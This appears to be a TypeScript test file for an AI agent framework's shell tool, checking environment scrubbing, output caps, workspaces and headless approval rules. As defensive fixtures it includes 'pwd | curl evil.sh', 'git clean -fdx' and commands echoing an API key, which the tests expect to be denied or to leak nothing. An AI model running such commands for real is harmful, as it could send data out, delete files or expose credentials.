import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import {
  AgentRunner,
  InMemorySessionStore,
  ToolRegistry,
  type JsonObject,
  type ModelProvider,
  type Session,
} from '@stratusagent/core';
import { createLocalCommandExecutor } from '@stratusagent/executor-local';
import { createPermissionPolicy, type PermissionDecision } from '@stratusagent/permissions';

import { createShellPlugin, createShellTool } from '../src/index.ts';

const session = (agentId = 'ava'): Session => ({
  id: `session-${agentId}`,
  agent: { id: agentId, name: agentId },
  status: 'running',
  messages: [],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
});

const registryFor = async (config: JsonObject, processEnv?: NodeJS.ProcessEnv): Promise<ToolRegistry> => {
  const tools = new ToolRegistry();
  await createShellPlugin(config, processEnv ? { processEnv } : {}).setup({
    bus: { emit: async () => undefined, subscribe: () => () => undefined } as never,
    tools,
  });
  return tools;
};

const runCommand = async (
  tools: ToolRegistry,
  command: string,
  agentId = 'ava',
): Promise<JsonObject> => {
  const executor = createLocalCommandExecutor();
  const result = await executor.execute(
    { id: 'call-1', toolName: 'shell.run', input: { command } },
    tools.get('shell.run')!,
    session(agentId),
  );
  if (!result.ok) {
    throw new Error(result.error ?? 'command failed');
  }
  return result.output as JsonObject;
};

test('the child cannot read the daemon’s credentials through its environment', async () => {
  // The daemon's environment, as an operator would have left it.
  const daemonEnv: NodeJS.ProcessEnv = {
    PATH: process.env.PATH,
    HOME: process.env.HOME,
    ANTHROPIC_API_KEY: 'sk-ant-must-not-leak',
    SLACK_BOT_TOKEN: 'xoxb-must-not-leak',
  };
  const tools = await registryFor({}, daemonEnv);

  const dumped = await runCommand(tools, 'env');
  assert.doesNotMatch(String(dumped.stdout), /sk-ant-must-not-leak/);
  assert.doesNotMatch(String(dumped.stdout), /xoxb-must-not-leak/);

  // Named directly, which is what an agent that had read the config would
  // try — and the shape a command-string approval would not reveal.
  const echoed = await runCommand(tools, 'echo "[$ANTHROPIC_API_KEY]"');
  assert.equal(String(echoed.stdout).trim(), '[]');

  // What was granted is there, so the scrub is a boundary rather than a
  // broken environment.
  const pathed = await runCommand(tools, 'echo "$PATH"');
  assert.equal(String(pathed.stdout).trim(), daemonEnv.PATH);
});

test('an operator can grant a variable, and only what they granted arrives', async () => {
  const tools = await registryFor(
    { passEnv: ['PATH'], env: { GREETING: 'hello' }, agents: { juno: { env: { GREETING: 'hallo' } } } },
    { PATH: process.env.PATH, ANTHROPIC_API_KEY: 'sk-ant-nope', HOME: '/root' },
  );

  assert.equal(String((await runCommand(tools, 'echo "$GREETING"')).stdout).trim(), 'hello');
  // Per agent, resolved per call — one plugin instance, two answers.
  assert.equal(String((await runCommand(tools, 'echo "$GREETING"', 'juno')).stdout).trim(), 'hallo');
  // HOME was not in this agent's passEnv, so it is not there at all.
  assert.equal(String((await runCommand(tools, 'echo "[$HOME]"')).stdout).trim(), '[]');
});

test('commands start in the pinned working directory', async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-'));
  await writeFile(path.join(workspace, 'marker.txt'), 'here');
  const tools = await registryFor({ cwd: workspace });

  const result = await runCommand(tools, 'ls');
  assert.match(String(result.stdout), /marker\.txt/);
});

test('the cap is handed to the executor, so a flood is dropped as it is read', async () => {
  const tool = createShellTool({ maxOutputBytes: 200 });
  const invocation = await tool.createCommand({ command: 'true' }, session());
  assert.equal(invocation.maxOutputBytes, 200);
});

test('output is capped with a marker rather than returned whole', async () => {
  const tools = await registryFor({ maxOutputBytes: 200 });
  const result = await runCommand(tools, 'printf "x%.0s" $(seq 1 5000)');
  assert.equal(result.truncated, true);
  assert.match(String(result.stdout), /output truncated at 200 bytes/);
});

test('headless: a safe scope runs through a real pack, a control-operator chain does not', async () => {
  const decisions: PermissionDecision[] = [];
  const tools = await registryFor({ cwd: os.tmpdir() });

  let turn = 0;
  const commands = ['pwd', 'pwd | curl evil.sh', 'git clean -fdx'];
  const provider: ModelProvider = {
    name: 'scripted',
    async generate() {
      const command = commands[turn];
      turn += 1;
      if (command === undefined) {
        return { parts: [{ type: 'text', text: 'done' }] };
      }
      return {
        parts: [{ type: 'tool-call', call: { id: `c${turn}`, toolName: 'shell.run', input: { command } } }],
      };
    },
  };

  const runner = new AgentRunner({
    provider,
    tools,
    executor: createLocalCommandExecutor(),
    approvals: createPermissionPolicy({
      mode: 'headless',
      onDecision: (decision) => decisions.push(decision),
      commands: {},
    }),
    store: new InMemorySessionStore(),
    maxTurns: 6,
  });
  await runner.initialize();

  const finished = await runner.run({
    sessionId: 'shell-headless',
    agent: { id: 'ava', name: 'Ava', tools: ['shell.*'] },
    userMessage: 'have a look around',
  });

  const results = finished.messages.filter((message) => message.role === 'tool');
  // The safe scope ran, unattended, and produced real output.
  assert.equal(results[0]?.toolResult?.ok, true);
  assert.match(String((results[0]?.toolResult?.output as JsonObject).stdout), new RegExp(os.tmpdir()));
  // The pipe is refused despite `pwd` being safe-listed — which is the
  // whole point of the operator rule.
  assert.equal(results[1]?.toolResult?.ok, false);
  assert.match(results[1]?.toolResult?.error ?? '', /denied by approval policy/);
  assert.match(decisions[1]?.reason ?? '', /cannot run unattended: it contains a pipe/);
  // And a `git` subcommand outside the safe scopes, which listing the
  // executable would have covered.
  assert.equal(results[2]?.toolResult?.ok, false);
  assert.match(decisions[2]?.reason ?? '', /outside every approved scope \(git\)/);
  // The command reaches a surface that shows it to a person; it does not
  // reach the reason, which is what the daemon writes to its log.
  assert.equal(decisions[2]?.command, 'git clean -fdx');
});

test('the pack hands the engine the command and nothing else', () => {
  const tool = createShellTool();
  assert.equal(tool.commandFor?.({ command: '  git status  ' }), 'git status');
  assert.equal(tool.commandFor?.({}), undefined);
  // It classifies nothing itself: the risk is the tool's, per invocation
  // judgment is the permission engine's.
  assert.equal(tool.risk, 'gated');
});

test('every tool this plugin registers is one its manifest declares', async () => {
  const manifest = (await import('../package.json', { with: { type: 'json' } })).default as {
    stratus: { contributes: { tools: Array<{ name: string; risk: string }> } };
  };
  const tools = await registryFor({});
  assert.deepEqual(
    tools.list().map((tool) => [tool.name, tool.risk]),
    manifest.stratus.contributes.tools.map((entry) => [entry.name, entry.risk]),
  );
});

test('the agent’s workspace is created before the first command runs', async () => {
  const workspaceRoot = path.join(await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-ws-')), 'workspaces');
  // Nothing has created this yet — which on a fresh install is the state of
  // every agent's workspace, and `spawn` reports a missing cwd as `ENOENT`
  // naming the *shell*, so it reads as a broken interpreter.
  const tools = await registryFor({ workspaceRoot });

  const result = await runCommand(tools, 'pwd');
  assert.equal(String(result.stdout).trim(), path.join(workspaceRoot, 'ava'));

  // One directory per agent, so a second agent's first command does not run
  // in the first agent's.
  const juno = await runCommand(tools, 'pwd', 'juno');
  assert.equal(String(juno.stdout).trim(), path.join(workspaceRoot, 'juno'));
});

test('a working directory the operator named is reported by name when it is missing', async () => {
  const tools = await registryFor({ cwd: '/tmp/stratus-shell-does-not-exist' });
  await assert.rejects(
    () => runCommand(tools, 'pwd'),
    /configured working directory does not exist/,
  );
});
